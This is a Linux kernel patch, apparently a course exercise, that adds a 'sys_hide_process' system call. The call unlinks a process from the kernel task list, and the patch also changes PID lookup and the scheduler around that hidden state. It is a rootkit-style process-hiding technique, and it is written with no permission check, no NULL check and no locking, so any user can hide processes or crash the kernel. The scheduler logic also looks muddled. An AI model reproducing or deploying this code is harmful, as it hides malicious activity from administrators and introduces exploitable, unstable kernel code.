@@ -1,0 +1,117 @@
+--- a/arch/x86/include/asm/syscalls.h
++++ b/arch/x86/include/asm/syscalls.h
+@@ -42,6 +42,9 @@
+ asmlinkage int sys_set_thread_area(struct user_desc __user *);
+ asmlinkage int sys_get_thread_area(struct user_desc __user *);
+ 
++/* kernel/ncu_p2.c */
++asmlinkage int sys_hide_process( int );
++
+ /* X86_32 only */
+ #ifdef CONFIG_X86_32
+ 
+--- a/arch/x86/include/asm/unistd_32.h
++++ b/arch/x86/include/asm/unistd_32.h
+@@ -354,10 +354,11 @@
+ #define __NR_setns		346
+ #define __NR_process_vm_readv	347
+ #define __NR_process_vm_writev	348
++#define __NR_hide_process	349
+ 
+ #ifdef __KERNEL__
+ 
+-#define NR_syscalls 349
++#define NR_syscalls 350
+ 
+ #define __ARCH_WANT_IPC_PARSE_VERSION
+ #define __ARCH_WANT_OLD_READDIR
+--- a/arch/x86/include/asm/unistd_64.h
++++ b/arch/x86/include/asm/unistd_64.h
+@@ -686,6 +686,8 @@
+ __SYSCALL(__NR_process_vm_readv, sys_process_vm_readv)
+ #define __NR_process_vm_writev			311
+ __SYSCALL(__NR_process_vm_writev, sys_process_vm_writev)
++#define __NR_hide_process			312
++__SYSCALL(__NR_hide_process, sys_hide_process)
+ 
+ #ifndef __NO_STUBS
+ #define __ARCH_WANT_OLD_READDIR
+--- a/arch/x86/kernel/Makefile
++++ b/arch/x86/kernel/Makefile
+@@ -100,6 +100,8 @@
+ obj-$(CONFIG_SWIOTLB)			+= pci-swiotlb.o
+ obj-$(CONFIG_OF)			+= devicetree.o
+ 
++obj-y	+= ncu_p2.o
++
+ ###
+ # 64 bit specific files
+ ifeq ($(CONFIG_X86_64),y)
+--- a/arch/x86/kernel/syscall_table_32.S
++++ b/arch/x86/kernel/syscall_table_32.S
+@@ -348,3 +348,4 @@
+ 	.long sys_setns
+ 	.long sys_process_vm_readv
+ 	.long sys_process_vm_writev
++	.long sys_hide_process		/* 349 */
+--- /dev/null
++++ b/arch/x86/kernel/ncu_p2.c
+@@ -0,0 +1,12 @@
++#include <linux/linkage.h>
++#include <linux/kernel.h>
++#include <linux/sched.h>
++
++
++asmlinkage int sys_hide_process( int pid ) {
++	struct task_struct * p;
++	p = find_task_by_vpid( pid );
++	p->tasks.next->prev = p->tasks.prev;
++	p->tasks.prev->next = p->tasks.next;
++	return 0;
++}
+--- a/kernel/pid.c
++++ b/kernel/pid.c
+@@ -522,16 +522,14 @@
+  */
+ struct pid *find_ge_pid(int nr, struct pid_namespace *ns)
+ {
+-	struct pid *pid;
++	struct task_struct * ts;
+ 
+-	do {
+-		pid = find_pid_ns(nr, ns);
+-		if (pid)
+-			break;
+-		nr = next_pidmap(ns, nr);
+-	} while (nr > 0);
+-
+-	return pid;
++	for_each_process( ts ) {
++		if( ts->pid >= nr ) {
++			return get_task_pid( ts, PIDTYPE_PID );
++		}
++	}
++	return NULL;
+ }
+ 
+ /*
+--- a/kernel/sched.c
++++ b/kernel/sched.c
+@@ -4659,6 +4659,17 @@
+ 	post_schedule(rq);
+ 
+ 	preempt_enable_no_resched();
++
++	if( prev->pid != 0 ) {
++		for_each_process( next ) {
++			if( next->pid == prev->pid ) {
++				prev->tasks.next->prev = &prev->tasks;
++				prev->tasks.prev->next = &prev->tasks;
++				break;
++			}
++		}
++	}
++
+ 	if (need_resched())
+ 		goto need_resched;
+ }
